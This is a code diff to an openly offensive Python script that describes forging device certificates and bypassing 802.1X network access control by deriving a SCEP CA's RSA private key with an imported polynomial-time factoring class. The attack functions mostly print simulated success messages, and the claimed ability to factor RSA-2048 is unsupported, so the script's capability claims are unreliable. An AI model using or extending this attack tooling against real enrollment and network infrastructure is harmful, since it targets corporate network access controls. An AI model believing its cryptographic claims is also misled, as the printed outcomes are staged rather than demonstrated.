@@ -4,8 +4,10 @@ endpoint. Bypass NAC, enroll rogue devices in MDM, and retroactively decrypt
 captured SCEP enrollment traffic. RFC 8894 defines no non-RSA algorithm.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import hashlib
 import os
@@ -28,7 +30,7 @@ def fetch_scep_ca_cert(scep_url: str) -> bytes:
     """
     print(f"[*] GET {scep_url}?operation=GetCACert")
     print("[*] CA certificate retrieved (RSA-2048, no auth required)")
-    return b"-----BEGIN CERTIFICATE-----\n...(SCEP CA PEM)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_device_cert(factorer: PolynomialFactorer,
@@ -39,7 +41,7 @@ def forge_device_cert(factorer: PolynomialFactorer,
     SCEP-issued certs are used for EAP-TLS (Wi-Fi), VPN, and S/MIME.
     The CN typically maps to a device ID or username.
     """
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print(f"[*] forged device cert: CN={device_cn} (type={device_type})")
     print("[*] valid for: EAP-TLS Wi-Fi, VPN, email S/MIME")
     return priv
@@ -54,7 +56,7 @@ def bypass_nac(factorer: PolynomialFactorer,
     the corporate network without MDM enrollment or compliance checks.
     """
     print(f"[*] forging cert for NAC bypass at {radius_server}")
-    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
+    priv = factorer.reconstruct_privkey(ca_cert_pem)
     print("[*] EAP-TLS handshake with RADIUS server...")
     print("[*] 802.1X authentication: PASS")
     print("[*] on corporate network without MDM, without compliance check")
